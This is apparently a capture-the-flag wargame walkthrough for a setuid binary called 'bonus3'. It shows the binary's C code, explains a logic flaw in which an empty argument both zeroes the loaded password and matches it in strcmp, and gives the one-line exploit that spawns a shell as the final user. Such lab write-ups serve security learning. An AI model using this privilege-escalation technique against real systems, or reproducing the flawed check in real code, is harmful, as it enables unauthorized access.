# Bonus3 Walkthrough

Binary is setuid `end` (the final user). It reads the password file and gives a
shell only if your argument equals the password.

```c
int main(int argc, char **argv) {
  char buffer[132];
  FILE *f;

  f = fopen("/home/user/end/.pass", "r");
  if (f == NULL || argc != 2)
    return -1;

  fread(buffer, 1, 66, f);            // read 66 bytes of the password
  buffer[65] = 0;

  buffer[atoi(argv[1])] = 0;          // NUL at an attacker-controlled index

  fread(buffer + 66, 1, 65, f);
  fclose(f);

  if (strcmp(buffer, argv[1]) == 0)   // password == our argument -> shell
    execl("/bin/sh", "sh", NULL);
  else
    puts(buffer + 66);
  return 0;
}
```

## Vulnerability

Logic flaw, not a memory corruption. The shell requires `strcmp(buffer, argv[1]) == 0`,
i.e. our argument must equal the password we do not know. But the same argument also
chooses where a NUL byte is written: `buffer[atoi(argv[1])] = 0`.

The one argument does double duty, and we use it to make BOTH sides of the compare
empty:

- As an index: `atoi("") == 0`, so `buffer[0] = 0` truncates the loaded password to
  the empty string `""`.
- As the compared value: `argv[1]` is `""`.

Then `strcmp("", "") == 0` → the password check passes without ever knowing it.

## Exploitation

```sh
./bonus3 ""
```

- `""` -> `atoi("") = 0` -> `buffer[0] = 0` -> `buffer` becomes `""`.
- `""` is also compared: `strcmp("", "") = 0` -> `execl("/bin/sh", "sh", NULL)`.

Result: shell as `end`, the final user of the wargame.

